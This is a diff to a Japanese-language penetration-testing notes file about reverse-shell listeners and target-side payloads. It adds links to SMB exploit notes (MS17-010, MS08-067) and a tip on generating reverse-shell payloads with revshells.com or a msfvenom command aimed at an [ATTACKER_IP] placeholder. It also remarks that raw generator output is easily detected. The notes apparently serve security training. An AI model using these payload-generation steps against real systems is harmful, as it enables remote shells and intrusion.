@@ -6,6 +6,8 @@
 - `../02_Initial_Access/Web_Vulnerabilities/Command_Injection.md`
 - `../02_Initial_Access/Web_Vulnerabilities/XSS.md`
 - `../03_Post_Access_Linux/Shell_Stabilization.md`
+- `../02_Initial_Access/SMB_Windows_Exploitation.md`（MS17-010 / MS08-067 手動 PoC 経路のリスナー準備）
+- `../05_Tools_Reference/Metasploit.md`（msf handler と nc の住み分け）
 
 ---
 
@@ -122,6 +124,8 @@ msf のリバースシェル系モジュールは **`run` と同時に内部で�
 ## ターゲット側のペイロード例
 
 以下は `LHOST=[ATTACKER_IP]` `LPORT=4444` の場合の例。実際の値に置き換えること。
+
+> **網羅的なペイロード生成**: 言語・OS・シェル種別ごとの雛形を毎回手で書くより生成器が速い。オンラインなら revshells.com（リバースシェル生成器・コピペ用）。オフライン環境では `msfvenom -l payloads` で一覧 → `msfvenom -p [PAYLOAD] LHOST=[ATTACKER_IP] LPORT=[PORT] -f [FORMAT]` で生成する。本番では生成器の出力をそのまま使うと検知されやすい点に留意（注意点・落とし穴参照）。
 
 ### bash
 
